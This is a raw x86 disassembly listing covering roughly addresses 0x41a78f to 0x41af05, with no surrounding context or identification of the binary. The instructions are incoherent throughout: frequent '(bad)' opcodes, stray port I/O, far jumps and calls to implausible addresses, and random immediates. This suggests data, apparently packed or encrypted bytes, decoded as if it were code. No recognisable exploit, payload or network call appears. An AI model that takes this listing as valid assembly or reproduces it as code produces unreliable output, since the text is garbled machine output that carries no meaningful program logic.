  41a78f:	retf   0xe0a
  41a792:	arpl   WORD PTR [edx-0xcad3f40],ax
  41a798:	dec    edx
  41a799:	int    0x91
  41a79b:	dec    ecx
  41a79c:	test   BYTE PTR [eax+0x1a20a34c],al
  41a7a2:	jae    0x41a738
  41a7a4:	ja     0x41a764
  41a7a6:	out    dx,al
  41a7a7:	or     BYTE PTR [edx],0x6e
  41a7aa:	inc    ecx
  41a7ab:	xor    BYTE PTR [esi+eiz*4-0x5e1bae4b],dl
  41a7b2:	pop    ds
  41a7b3:	inc    esp
  41a7b4:	pop    ds
  41a7b5:	sub    edi,DWORD PTR [edi+0x62]
  41a7b8:	icebp  
  41a7b9:	femms  
  41a7bb:	nop
  41a7bc:	inc    ebp
  41a7bd:	rcl    DWORD PTR ds:0x74f565ef,1
  41a7c3:	adc    BYTE PTR [ecx-0x60],dh
  41a7c6:	(bad)  
  41a7c7:	aad    0x65
  41a7c9:	push   ebp
  41a7ca:	ds jns 0x41a75f
  41a7cd:	jle    0x41a81d
  41a7cf:	fs jge 0x41a781
  41a7d2:	sub    ebp,DWORD PTR [eax+eax*1+0x688a248a]
  41a7d9:	mov    bh,0xa
  41a7db:	stc    
  41a7dc:	out    0x2a,eax
  41a7de:	mov    ebx,0x12e4100
  41a7e3:	bound  edi,QWORD PTR [edi+0x83fca5f]
  41a7e9:	int    0x1f
  41a7eb:	cs jl  0x41a84f
  41a7ee:	sbb    eax,0xb0061ef1
  41a7f3:	push   ebx
  41a7f4:	loope  0x41a7e2
  41a7f6:	ds test al,0x89
  41a7f9:	mov    al,0x13
  41a7fb:	cmp    eax,0x10fa21bc
  41a800:	cdq    
  41a801:	jmp    0x2509:0xd025fc46
  41a808:	jnp    0x41a827
  41a80a:	push   ebx
  41a80b:	sbb    dh,ch
  41a80d:	adc    edi,DWORD PTR [edi-0x18]
  41a810:	mov    esi,0xcba04884
  41a815:	jmp    FWORD PTR [ebx+edi*2]
  41a818:	and    cl,dh
  41a81a:	pop    edx
  41a81b:	pop    edx
  41a81c:	inc    esp
  41a81d:	add    BYTE PTR [ebx],bl
  41a81f:	ins    BYTE PTR es:[edi],dx
  41a820:	leave  
  41a821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a822:	ror    ch,0x8b
  41a825:	iret   
  41a826:	push   cs
  41a827:	xor    ch,BYTE PTR [ebp+0x7ce7648d]
  41a82d:	adc    al,0xef
  41a82f:	pusha  
  41a830:	add    dl,BYTE PTR [eax+0x2]
  41a833:	xchg   esi,eax
  41a834:	stos   DWORD PTR es:[edi],eax
  41a835:	jle    0x41a868
  41a837:	jmp    0xc5be9d5e
  41a83c:	cdq    
  41a83d:	jle    0x41a84c
  41a83f:	jmp    0xa4cc2a04
  41a844:	out    dx,eax
  41a845:	jg     0x41a839
  41a847:	enter  0x65cf,0x61
  41a84b:	out    0x4,eax
  41a84d:	int    0x4b
  41a84f:	es addr16 call 0x184b6cfb
  41a856:	call   0xa1236838
  41a85b:	jp     0x41a887
  41a85d:	mov    bl,0xa3
  41a85f:	sub    dh,dh
  41a861:	test   ecx,esp
  41a863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a864:	fwait
  41a865:	push   esi
  41a866:	sub    BYTE PTR [eax-0x65656b29],al
  41a86c:	cmp    ah,ah
  41a86e:	inc    esp
  41a86f:	inc    ebx
  41a870:	fbstp  TBYTE PTR [esp+esi*2]
  41a873:	call   0xe3f7:0x5096e4c2
  41a87a:	and    esi,DWORD PTR [ecx]
  41a87c:	dec    ebp
  41a87d:	popa   
  41a87e:	sbb    al,0x29
  41a880:	dec    edx
  41a881:	xchg   ecx,eax
  41a882:	std    
  41a883:	push   edi
  41a884:	test   al,0x72
  41a886:	add    eax,0xd22ae737
  41a88b:	mov    ebx,0x7467f639
  41a890:	mov    WORD PTR [edx-0xde06c2],ss
  41a896:	leave  
  41a897:	out    dx,al
  41a898:	mov    eax,ds:0xb489488
  41a89d:	sub    eax,0xe548ed1d
  41a8a2:	pop    ebp
  41a8a3:	es push edx
  41a8a5:	add    al,0x13
  41a8a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8a8:	out    0x2d,al
  41a8aa:	or     esi,ebp
  41a8ac:	repnz xchg ebp,eax
  41a8ae:	pushf  
  41a8af:	loope  0x41a91f
  41a8b1:	jmp    0x900ed604
  41a8b6:	ins    BYTE PTR es:[edi],dx
  41a8b7:	shr    DWORD PTR [edx],cl
  41a8b9:	lock or al,0xba
  41a8bc:	outs   dx,DWORD PTR ds:[esi]
  41a8bd:	add    dh,cl
  41a8bf:	data16 sub BYTE PTR [eax+eax*1-0x5f5292c],ch
  41a8c7:	outs   dx,BYTE PTR ds:[esi]
  41a8c8:	ss ret 0xe206
  41a8cc:	inc    edx
  41a8cd:	sub    ch,bl
  41a8cf:	loop   0x41a939
  41a8d1:	jns    0x41a946
  41a8d3:	(bad)  [esp+ebx*1-0xc]
  41a8d7:	xchg   ebx,eax
  41a8d8:	fldenv [edx+0xa1f4e4c]
  41a8de:	(bad)  
  41a8df:	cmp    edi,DWORD PTR [edx-0x26a5dc17]
  41a8e5:	in     eax,0xf0
  41a8e7:	popf   
  41a8e8:	call   0xa3b5bb9f
  41a8ed:	inc    edx
  41a8ee:	cmp    WORD PTR ds:0x76e5330b,0x7d
  41a8f6:	das    
  41a8f7:	mov    ch,0x80
  41a8f9:	and    DWORD PTR [ecx+0x48],esi
  41a8fc:	add    ebp,0x1f
  41a8ff:	cmp    eax,0xaaafe04
  41a904:	aas    
  41a905:	push   esp
  41a906:	ja     0x41a8b6
  41a908:	sti    
  41a909:	outs   dx,DWORD PTR ds:[esi]
  41a90a:	mov    cl,0x7e
  41a90c:	ret    0xa5fb
  41a90f:	arpl   cx,bx
  41a911:	add    eax,0xe4b17087
  41a917:	imul   edi,DWORD PTR [ebx+0x68],0x72
  41a91b:	arpl   WORD PTR [edi+ebp*2+0x3b],di
  41a91f:	cmp    BYTE PTR [ebx],dh
  41a921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a922:	dec    esp
  41a923:	push   eax
  41a924:	mov    eax,ds:0xe068f039
  41a929:	jnp    0x41a8de
  41a92b:	lods   al,BYTE PTR ds:[esi]
  41a92c:	jno    0x41a96a
  41a92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a92f:	hlt    
  41a930:	pop    ss
  41a931:	push   ss
  41a932:	or     esp,DWORD PTR [ebx+0x69]
  41a935:	in     eax,0x25
  41a937:	adc    ah,BYTE PTR [edi+0x2fe0091b]
  41a93d:	into   
  41a93e:	mov    ah,BYTE PTR [ecx]
  41a940:	jmp    0x80f3:0x97169011
  41a947:	jge    0x41a94c
  41a949:	jo     0x41a9a3
  41a94b:	test   DWORD PTR [esi+0x78],edx
  41a94e:	lea    esp,[edi+0x5d]
  41a951:	scas   al,BYTE PTR es:[edi]
  41a952:	into   
  41a953:	cdq    
  41a954:	div    DWORD PTR gs:[ecx-0x7519bf31]
  41a95b:	stos   BYTE PTR es:[edi],al
  41a95c:	sahf   
  41a95d:	add    BYTE PTR [ebx+0x35],dh
  41a960:	and    dh,BYTE PTR [ecx]
  41a962:	push   0x24db8965
  41a967:	mov    ecx,0xb0a79d95
  41a96c:	push   ecx
  41a96d:	fisubr DWORD PTR [ebx+0x6de45485]
  41a973:	in     al,0x50
  41a975:	ds rcr bl,cl
  41a978:	fnstenv [eax+0x1ab90cef]
  41a97e:	sbb    DWORD PTR [edi-0x6b23f176],ebp
  41a984:	cmp    cl,ch
  41a986:	call   0x9c567820
  41a98b:	jo     0x41a969
  41a98d:	xchg   edi,eax
  41a98e:	loope  0x41aa0e
  41a990:	hlt    
  41a991:	push   ss
  41a992:	pop    edi
  41a993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a994:	mov    esi,ecx
  41a996:	lods   eax,DWORD PTR ds:[esi]
  41a997:	adc    BYTE PTR [ebx-0x62f6b51e],bl
  41a99d:	cmp    edi,edx
  41a99f:	lock inc ebx
  41a9a1:	call   0xf317fd73
  41a9a6:	leave  
  41a9a7:	adc    BYTE PTR [ecx-0x3e],ch
  41a9aa:	xlat   BYTE PTR ds:[ebx]
  41a9ab:	gs (bad) 
  41a9ad:	add    eax,0x91523dcc
  41a9b2:	dec    esi
  41a9b3:	or     eax,0x4c61b4fa
  41a9b8:	sub    al,0x6d
  41a9ba:	mov    esp,DWORD PTR [ebx]
  41a9bc:	pmullw mm7,QWORD PTR [ebx-0x4a0dc2ac]
  41a9c3:	push   edi
  41a9c4:	inc    edx
  41a9c5:	aas    
  41a9c6:	ins    DWORD PTR es:[edi],dx
  41a9c7:	into   
  41a9c8:	imul   edx,DWORD PTR [esi],0xffffff9a
  41a9cb:	ja     0x41a9a1
  41a9cd:	push   ebx
  41a9ce:	push   esi
  41a9cf:	or     eax,0x76d2448e
  41a9d4:	ret    0xbae0
  41a9d7:	in     al,0xee
  41a9d9:	(bad)  
  41a9da:	mov    bl,0x79
  41a9dc:	call   0xe3f1:0xad3a1f74
  41a9e3:	cmp    eax,0xfe2538f7
  41a9e8:	stos   DWORD PTR es:[edi],eax
  41a9e9:	and    cl,BYTE PTR [edi-0x6c530e2f]
  41a9ef:	mov    al,ds:0x9afa6262
  41a9f4:	xor    DWORD PTR [esi],esp
  41a9f6:	xchg   DWORD PTR [ebx+0x7e],ecx
  41a9f9:	loopne 0x41aa5b
  41a9fb:	pop    ecx
  41a9fc:	popf   
  41a9fd:	sahf   
  41a9fe:	idiv   DWORD PTR [ebx+0x5cc8ce9e]
  41aa04:	push   es
  41aa05:	faddp  st(2),st
  41aa07:	sti    
  41aa08:	jge    0x41a9c7
  41aa0a:	pop    edx
  41aa0b:	pop    ss
  41aa0c:	fld    st(0)
  41aa0e:	and    eax,ecx
  41aa10:	(bad)  [esi-0x5b78411b]
  41aa16:	xchg   esp,eax
  41aa17:	pop    ds
  41aa18:	arpl   WORD PTR [ebx+eiz*1-0x49ac1846],ax
  41aa1f:	mov    ds:0xc0cf9c93,al
  41aa24:	adc    al,BYTE PTR [esi]
  41aa26:	int    0x2d
  41aa28:	outs   dx,BYTE PTR ds:[esi]
  41aa29:	(bad)  
  41aa2a:	cmp    ebx,eax
  41aa2c:	or     DWORD PTR [eax],esi
  41aa2e:	sbb    edx,DWORD PTR [edx+0x5]
  41aa31:	out    0x8b,eax
  41aa33:	jns    0x41aa7b
  41aa35:	les    ebx,FWORD PTR [ecx+esi*4]
  41aa38:	jp     0x41aa43
  41aa3a:	xchg   ebx,eax
  41aa3b:	mov    eax,ds:0x89ac8208
  41aa40:	sti    
  41aa41:	aas    
  41aa42:	repz jmp 0x826:0x72ef6d1a
  41aa4a:	add    cl,BYTE PTR [eax]
  41aa4c:	shl    esp,1
  41aa4e:	sbb    bh,dh
  41aa50:	lea    ebp,[ebx]
  41aa52:	retf   0x8185
  41aa55:	rol    DWORD PTR [edx-0x1e5a3b33],cl
  41aa5b:	xchg   ebx,eax
  41aa5c:	mov    al,0x27
  41aa5e:	mov    edx,0x29400b7a
  41aa63:	fidivr DWORD PTR [eax-0x2fd499cf]
  41aa69:	fwait
  41aa6a:	icebp  
  41aa6b:	ins    DWORD PTR es:[edi],dx
  41aa6c:	test   DWORD PTR [ebp-0x1e455b79],ebp
  41aa72:	jno    0x41aa22
  41aa74:	in     eax,dx
  41aa75:	ret    0x7e46
  41aa78:	aaa    
  41aa79:	in     al,0x29
  41aa7b:	test   DWORD PTR [eax-0x37],esi
  41aa7e:	sti    
  41aa7f:	dec    esi
  41aa80:	xchg   BYTE PTR [ecx-0x29],ch
  41aa83:	jp     0x41aa57
  41aa85:	xor    eax,0x979d2b0
  41aa8a:	das    
  41aa8b:	pop    eax
  41aa8c:	push   0xffffffb3
  41aa8e:	addps  xmm1,XMMWORD PTR [esi-0x49]
  41aa92:	xchg   ebp,eax
  41aa93:	fisub  WORD PTR [edx]
  41aa95:	pop    edx
  41aa96:	sub    BYTE PTR [esi-0x50],0x0
  41aa9a:	lahf   
  41aa9b:	(bad)  
  41aa9c:	push   ecx
  41aa9e:	jecxz  0x41aaa4
  41aaa0:	and    DWORD PTR [edi-0x4dac2a42],ebx
  41aaa6:	adc    BYTE PTR [edx],0x49
  41aaa9:	aad    0x31
  41aaab:	loop   0x41aa2e
  41aaad:	leave  
  41aaae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaaf:	jmp    0x41aa51
  41aab1:	or     DWORD PTR [ebp-0x5f5d78f8],edx
  41aab7:	sub    eax,DWORD PTR [edx]
  41aab9:	pop    ecx
  41aaba:	mov    ?,WORD PTR [eax+eax*1-0x49975517]
  41aac1:	jno    0x41aaa0
  41aac3:	push   edx
  41aac4:	retf   
  41aac5:	xchg   BYTE PTR [edx+0x4d],bl
  41aac8:	bound  edx,QWORD PTR [ecx]
  41aaca:	sub    cl,ah
  41aacc:	ss push cs
  41aace:	lahf   
  41aacf:	push   ss
  41aad0:	inc    edi
  41aad1:	pop    ebx
  41aad2:	adc    BYTE PTR [esi],0x43
  41aad5:	sub    al,BYTE PTR [ecx+0x6467884b]
  41aadb:	lock xor BYTE PTR [ebp+0x1],ah
  41aadf:	ins    BYTE PTR es:[edi],dx
  41aae0:	dec    edi
  41aae1:	jne    0x41ab3c
  41aae3:	xor    eax,0x953a70a9
  41aae8:	ror    BYTE PTR [esi],0xb3
  41aaeb:	mov    al,0xcd
  41aaed:	fiadd  WORD PTR [ebp+edi*8-0x6e]
  41aaf1:	adc    BYTE PTR [edx-0x5d],bh
  41aaf4:	enter  0x7e08,0x62
  41aaf8:	clc    
  41aaf9:	js     0x41aac3
  41aafb:	ret    
  41aafc:	adc    al,0x60
  41aafe:	fwait
  41aaff:	dec    ebx
  41ab00:	adc    eax,0x7e07f74d
  41ab05:	(bad)  [edx-0x1e]
  41ab08:	fcmovnb st,st(1)
  41ab0a:	arpl   WORD PTR [edx-0x47],dx
  41ab0d:	inc    ebp
  41ab0e:	inc    edx
  41ab0f:	call   0xdbf6a466
  41ab14:	or     ebx,DWORD PTR [esp+edi*2]
  41ab17:	ja     0x41aadc
  41ab19:	pop    esp
  41ab1a:	fstp   TBYTE PTR [ebx+ebp*1-0x141b8e7e]
  41ab21:	dec    edi
  41ab22:	(bad)  
  41ab23:	mov    BYTE PTR [ebp+0x4f],bh
  41ab26:	mov    WORD PTR [edx+0xf641039],ds
  41ab2c:	addr16 xchg ecx,eax
  41ab2e:	dec    ecx
  41ab2f:	sub    BYTE PTR [edx],0x8b
  41ab32:	lahf   
  41ab33:	cmc    
  41ab34:	mov    BYTE PTR [ecx],dl
  41ab36:	adc    ah,BYTE PTR [edi+0x7c6043a0]
  41ab3c:	mov    ecx,0x88d3f7f4
  41ab41:	add    al,0x5f
  41ab43:	mov    eax,es
  41ab45:	js     0x41ab89
  41ab47:	sar    BYTE PTR [eax+0x3a],cl
  41ab4a:	lods   al,BYTE PTR ds:[esi]
  41ab4b:	aad    0xc7
  41ab4d:	push   si
  41ab4f:	xchg   ebx,eax
  41ab50:	mov    BYTE PTR ds:0x18379292,ah
  41ab56:	xor    ebp,edx
  41ab58:	jecxz  0x41ab1f
  41ab5a:	push   eax
  41ab5b:	(bad)  [esi]
  41ab5d:	mov    dl,0x97
  41ab5f:	nop
  41ab60:	out    dx,eax
  41ab61:	and    DWORD PTR [ecx-0x6fa843e0],ebp
  41ab67:	jae    0x41abba
  41ab69:	add    ebp,DWORD PTR [ecx+0x34]
  41ab6c:	(bad)  
  41ab6e:	stc    
  41ab6f:	dec    edi
  41ab70:	and    BYTE PTR [ecx-0x446d2f8b],dh
  41ab76:	xchg   edi,eax
  41ab77:	jg     0x41ab6a
  41ab79:	mov    esp,0x3ffcb868
  41ab7e:	imul   esi,DWORD PTR [ebx-0x726f9986],0x10
  41ab85:	test   BYTE PTR [ecx+ebp*2-0x4e],cl
  41ab89:	loope  0x41aba8
  41ab8b:	lods   al,BYTE PTR ds:[esi]
  41ab8c:	mov    al,0x16
  41ab8e:	push   ebx
  41ab8f:	xchg   edi,eax
  41ab90:	jle    0x41ab8b
  41ab92:	mov    ch,0x82
  41ab94:	js     0x41abb0
  41ab96:	popa   
  41ab97:	not    ebx
  41ab99:	bound  esi,QWORD PTR ss:[edx+0x1c567ad1]
  41aba0:	sub    BYTE PTR [edi+0x55],dl
  41aba3:	js     0x41ab3e
  41aba5:	inc    esi
  41aba6:	jnp    0x41abd0
  41aba8:	out    dx,al
  41aba9:	daa    
  41abaa:	and    eax,0xd2aa1c24
  41abaf:	call   0x6566f420
  41abb4:	mov    esi,0x12ece486
  41abb9:	sub    DWORD PTR [edx],ecx
  41abbb:	pop    esi
  41abbc:	out    0xbb,al
  41abbe:	in     eax,0x31
  41abc0:	push   ds
  41abc1:	bound  edi,QWORD PTR [esi+eax*2]
  41abc4:	stos   DWORD PTR es:[edi],eax
  41abc5:	mov    dl,0x77
  41abc7:	lods   al,BYTE PTR ds:[esi]
  41abc8:	add    eax,0x34cba5fd
  41abcd:	mov    ds:0x9dca9a35,al
  41abd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abd3:	mov    edi,0x6b89aa3d
  41abd8:	icebp  
  41abd9:	jne    0x41ac07
  41abdb:	popf   
  41abdc:	lock ret 0xe356
  41abe0:	sysenter 
  41abe2:	lods   al,BYTE PTR ds:[esi]
  41abe3:	outs   dx,DWORD PTR ds:[esi]
  41abe4:	hlt    
  41abe5:	push   edx
  41abe6:	mov    DWORD PTR [ebp+0x2613807d],0xe05b9a47
  41abf0:	adc    esi,esp
  41abf2:	dec    BYTE PTR [edx+ebp*2+0x5ef4639]
  41abf9:	cs and eax,0xb37e8194
  41abff:	fsub   QWORD PTR [eax-0x163b3180]
  41ac05:	xchg   esi,eax
  41ac06:	call   0x1176:0xa63e5acb
  41ac0d:	ins    DWORD PTR es:[edi],dx
  41ac0e:	jl     0x41ac55
  41ac10:	sti    
  41ac11:	sbb    ecx,edx
  41ac13:	jne    0x41abe2
  41ac15:	mov    cl,0x40
  41ac17:	pop    ecx
  41ac18:	daa    
  41ac19:	test   al,0xc1
  41ac1b:	push   edx
  41ac1c:	scas   eax,DWORD PTR es:[edi]
  41ac1d:	sub    edx,edx
  41ac1f:	dec    DWORD PTR [ebx+0x4f]
  41ac22:	or     BYTE PTR [edx-0xa124430],cl
  41ac28:	xlat   BYTE PTR ds:[ebx]
  41ac29:	arpl   WORD PTR [ecx],si
  41ac2b:	out    0x71,eax
  41ac2d:	push   0xffffff84
  41ac2f:	enter  0x445d,0xa6
  41ac33:	(bad)  
  41ac34:	call   FWORD PTR [edi-0x9c64575]
  41ac3a:	inc    eax
  41ac3b:	fwait
  41ac3c:	add    ah,BYTE PTR [eax+0x5]
  41ac3f:	lods   al,BYTE PTR ds:[esi]
  41ac40:	das    
  41ac41:	sub    BYTE PTR [eax+0x2a],al
  41ac44:	pushf  
  41ac45:	adc    cl,BYTE PTR gs:[esp+ebx*1-0x2e]
  41ac4a:	pop    esi
  41ac4b:	sti    
  41ac4c:	adc    bh,BYTE PTR [edx-0x7f]
  41ac4f:	sbb    DWORD PTR gs:[edi-0x7de45bfb],0xbec1b0f8
  41ac5a:	adc    DWORD PTR [eax-0x2e],ebp
  41ac5d:	imul   DWORD PTR [ecx]
  41ac5f:	inc    ecx
  41ac60:	sbb    dh,BYTE PTR [ecx+0x27fe45cf]
  41ac66:	cmp    bh,BYTE PTR [ebx+edi*1]
  41ac69:	xlat   BYTE PTR ds:[ebx]
  41ac6a:	cli    
  41ac6b:	jb     0x41ac8f
  41ac6d:	xchg   ebp,eax
  41ac6e:	sub    DWORD PTR [ebp-0x3],ecx
  41ac71:	enter  0x553d,0x58
  41ac75:	dec    ebp
  41ac76:	pop    edi
  41ac77:	add    esi,esp
  41ac79:	je     0x41ac3d
  41ac7b:	and    ch,ah
  41ac7d:	xchg   esp,eax
  41ac7e:	out    dx,al
  41ac7f:	jle    0x41ace7
  41ac81:	adc    al,0x89
  41ac83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac84:	cdq    
  41ac85:	inc    edx
  41ac86:	adc    bh,0xbf
  41ac89:	push   edx
  41ac8a:	pop    eax
  41ac8b:	ins    BYTE PTR es:[edi],dx
  41ac8c:	pop    edx
  41ac8d:	adc    DWORD PTR [ebx-0x1c3c30a],eax
  41ac93:	bound  esi,QWORD PTR [ebp-0xd]
  41ac96:	jle    0x41ac22
  41ac98:	sub    eax,0x5ef3ca06
  41ac9d:	dec    esi
  41ac9e:	lahf   
  41ac9f:	dec    edi
  41aca0:	call   0x2aab3e75
  41aca5:	and    ebp,DWORD PTR [ecx+0x7f]
  41aca8:	mov    edi,?
  41acaa:	retf   
  41acab:	pusha  
  41acac:	sar    BYTE PTR [ebx+0x5],cl
  41acaf:	pop    ebx
  41acb0:	stos   BYTE PTR es:[edi],al
  41acb1:	dec    edx
  41acb2:	loope  0x41ad17
  41acb4:	dec    esi
  41acb5:	rcl    DWORD PTR ds:0xd8209623,1
  41acbb:	mov    DWORD PTR [esi+eiz*2-0x64],edi
  41acbf:	loopne 0x41acf9
  41acc1:	mov    dl,0xd6
  41acc3:	mov    ah,0x33
  41acc5:	cld    
  41acc6:	ret    0x4379
  41acc9:	(bad)  
  41acca:	stos   DWORD PTR es:[edi],eax
  41accb:	int    0xb8
  41accd:	pop    es
  41acce:	push   DWORD PTR [eax]
  41acd0:	fdiv   QWORD PTR [ebx+0x3a]
  41acd3:	xchg   ecx,eax
  41acd4:	inc    ebx
  41acd5:	fwait
  41acd6:	jg     0x41ac8d
  41acd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acd9:	push   0x8384ba35
  41acde:	cmp    eax,0x3b8427ce
  41ace3:	cmp    BYTE PTR [edx+0x1835610a],ah
  41ace9:	xchg   ebx,eax
  41acea:	daa    
  41aceb:	push   edx
  41acec:	test   al,0x6a
  41acee:	xor    edx,DWORD PTR es:[ecx-0x7316bdb8]
  41acf5:	push   esp
  41acf6:	and    ah,ah
  41acf8:	xor    BYTE PTR [ebp+edx*8-0x2d4026a0],ch
  41acff:	(bad)  
  41ad00:	test   eax,0xc282f37a
  41ad05:	ret    
  41ad06:	jmp    0x77cc:0xe30472c
  41ad0d:	jp     0x41acf4
  41ad0f:	lahf   
  41ad10:	jp     0x41aca8
  41ad12:	sub    ebp,DWORD PTR [eax-0x2d]
  41ad15:	not    BYTE PTR [ebx]
  41ad17:	sub    al,BYTE PTR [eax]
  41ad19:	cs aam 0xd0
  41ad1c:	xchg   ebx,eax
  41ad1d:	(bad)  
  41ad1e:	jge    0x41acbb
  41ad20:	adc    al,0x4
  41ad22:	enter  0x909e,0x65
  41ad26:	(bad)  
  41ad28:	test   ebx,edx
  41ad2a:	push   0x6236f158
  41ad2f:	cs sbb eax,0x942ee78e
  41ad35:	adc    DWORD PTR [ebp+0x69],edx
  41ad38:	fstp   QWORD PTR [edx+edi*2+0x23686b9e]
  41ad3f:	dec    edi
  41ad40:	and    eax,0x68b5cca
  41ad45:	push   ss
  41ad46:	inc    ebx
  41ad47:	xor    dh,BYTE PTR [ebp-0x708529ee]
  41ad4d:	into   
  41ad4e:	aas    
  41ad4f:	fld    DWORD PTR ds:0x3309800d
  41ad55:	or     eax,0x157e0f8c
  41ad5a:	jg     0x41ad72
  41ad5c:	stos   DWORD PTR es:[edi],eax
  41ad5d:	pop    esi
  41ad5e:	fcmovne st,st(6)
  41ad60:	dec    edi
  41ad61:	shr    BYTE PTR [esi+0x4f],0xfb
  41ad65:	cmp    dh,BYTE PTR [esi+0x1f058057]
  41ad6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad6c:	mov    edx,0x2fdbc7f0
  41ad71:	push   ds
  41ad72:	neg    BYTE PTR [ebp-0x17f1d56e]
  41ad78:	adc    ch,0x8d
  41ad7b:	mov    esp,0xdaa2b16c
  41ad80:	cmp    eax,0x609ea706
  41ad85:	data16 ins BYTE PTR es:[edi],dx
  41ad87:	or     DWORD PTR [edx],edi
  41ad89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad8a:	push   ss
  41ad8b:	mov    dh,0x6e
  41ad8d:	or     DWORD PTR [esi+0x11],edi
  41ad90:	fld    TBYTE PTR [edx]
  41ad92:	and    BYTE PTR [ecx-0x281983ea],0x53
  41ad99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad9a:	adc    DWORD PTR [esp+esi*1-0x4],edx
  41ad9e:	out    dx,eax
  41ad9f:	ja     0x41ade8
  41ada1:	in     al,dx
  41ada2:	and    eax,0x11a6dad8
  41ada7:	pop    esi
  41ada8:	sbb    DWORD PTR [edx],0x1f
  41adab:	sahf   
  41adac:	mov    si,0x476e
  41adb0:	(bad)  
  41adb1:	ins    DWORD PTR es:[edi],dx
  41adb2:	fistp  QWORD PTR [edx-0x73976a8d]
  41adb8:	int    0xcc
  41adba:	popa   
  41adbb:	pusha  
  41adbc:	(bad)  
  41adbd:	shl    BYTE PTR [esi+0x5ecccea2],1
  41adc3:	mov    ecx,0x5e624227
  41adc8:	lods   al,BYTE PTR ds:[esi]
  41adc9:	mov    eax,0x6337b542
  41adce:	cmp    eax,0xad4afea4
  41add3:	pop    ss
  41add4:	int3   
  41add5:	loope  0x41ad9e
  41add7:	cs dec ebp
  41add9:	mov    ebx,0x8b25779e
  41adde:	or     BYTE PTR [ecx],dh
  41ade0:	push   esi
  41ade1:	xchg   ecx,eax
  41ade2:	push   esi
  41ade3:	sahf   
  41ade4:	and    eax,0x343de032
  41ade9:	add    al,0x9e
  41adeb:	call   DWORD PTR [edx+0x5dcc5847]
  41adf1:	mov    esp,0x33055839
  41adf6:	xchg   bl,bl
  41adf8:	dec    esi
  41adf9:	mov    BYTE PTR [ebx-0x31],0xbe
  41adfd:	xchg   eax,esp
  41adff:	ret    0xd3c
  41ae02:	xor    eax,0x88a652c1
  41ae07:	stos   BYTE PTR es:[edi],al
  41ae08:	sbb    eax,0x614cb49
  41ae0d:	das    
  41ae0e:	repnz jmp 0x2ee4:0x8a5aaa16
  41ae16:	mov    bh,0x54
  41ae18:	(bad)  [ebp+0x70]
  41ae1b:	mov    esp,0x8843da01
  41ae20:	in     eax,0xc3
  41ae22:	loop   0x41ae56
  41ae24:	xchg   ebx,eax
  41ae25:	cmp    DWORD PTR [ebp-0x656354ab],esi
  41ae2b:	pop    edx
  41ae2c:	dec    esi
  41ae2d:	ret    0x1239
  41ae30:	shl    bl,1
  41ae32:	push   0x8527c755
  41ae37:	sub    al,0xff
  41ae39:	icebp  
  41ae3a:	iret   
  41ae3b:	mov    ecx,DWORD PTR [ebp-0x785905f6]
  41ae41:	mov    ecx,esp
  41ae43:	push   ss
  41ae44:	adc    esi,DWORD PTR [esi-0x57e0b4cc]
  41ae4a:	dec    ebx
  41ae4b:	mov    edx,0x16578089
  41ae50:	pop    eax
  41ae51:	mov    dh,0x5a
  41ae53:	push   es
  41ae54:	mov    al,0xed
  41ae56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae57:	jae    0x41ae9d
  41ae59:	int    0x85
  41ae5b:	mov    dh,0x55
  41ae5d:	jo     0x41ae5e
  41ae5f:	mov    ds:0xbfd3929c,eax
  41ae64:	bound  esp,QWORD PTR [edx]
  41ae66:	dec    esi
  41ae67:	add    bl,BYTE PTR [edx-0x487a5302]
  41ae6d:	xchg   DWORD PTR [esi*8-0x47f302ca],edi
  41ae74:	sti    
  41ae75:	lahf   
  41ae76:	sbb    cl,BYTE PTR [ebx+0x6c]
  41ae79:	or     dh,bh
  41ae7b:	sbb    dl,BYTE PTR [edi]
  41ae7d:	xchg   edi,eax
  41ae7e:	cwde   
  41ae7f:	xor    bl,BYTE PTR [edi+0x307188a3]
  41ae85:	adc    ah,BYTE PTR [ebx]
  41ae87:	jns    0x41ae39
  41ae89:	lock push esi
  41ae8b:	jne    0x41ae78
  41ae8d:	xor    eax,DWORD PTR ds:0x9d2c4879
  41ae93:	sbb    esi,DWORD PTR cs:[edx-0x54587a28]
  41ae9a:	xchg   esi,eax
  41ae9b:	enter  0x25e1,0x1e
  41ae9f:	push   cs
  41aea0:	in     al,dx
  41aea1:	and    bl,BYTE PTR [ebx]
  41aea3:	xor    DWORD PTR [esi-0x342cbda3],esi
  41aea9:	and    eax,ebx
  41aeab:	clc    
  41aeac:	sub    esp,DWORD PTR ds:0x1b64df34
  41aeb2:	sub    BYTE PTR [ecx],0x28
  41aeb5:	pop    esi
  41aeb6:	das    
  41aeb7:	sub    bh,BYTE PTR [eax+esi*8-0x5e]
  41aebb:	in     al,0x87
  41aebd:	(bad)  
  41aebe:	and    ebx,ecx
  41aec0:	push   edi
  41aec1:	(bad)  [edi]
  41aec3:	clc    
  41aec4:	jae    0x41aeaa
  41aec6:	(bad)  
  41aec8:	mov    dl,0x98
  41aeca:	pop    edi
  41aecb:	ds nop
  41aecd:	jecxz  0x41ae7a
  41aecf:	xchg   ecx,eax
  41aed0:	and    BYTE PTR [esi+0x70a682f2],dl
  41aed6:	ret    0x499b
  41aed9:	cmp    dh,BYTE PTR ds:0xe62211a5
  41aedf:	loop   0x41aecc
  41aee1:	sbb    ch,cl
  41aee3:	aaa    
  41aee4:	sbb    bl,BYTE PTR [esi-0x7f8c80d]
  41aeea:	scas   eax,DWORD PTR es:[edi]
  41aeeb:	fild   WORD PTR [eax-0x5c2df63]
  41aef1:	cmp    BYTE PTR ds:0xb7016481,0x86
  41aef8:	mov    al,ds:0x33a17544
  41aefd:	pop    edx
  41aefe:	or     eax,0x1df2416c
  41af03:	jl     0x41af7e
  41af05:	imul   eax,DWORD PTR [edx-0x55090bc3],0x28b31455
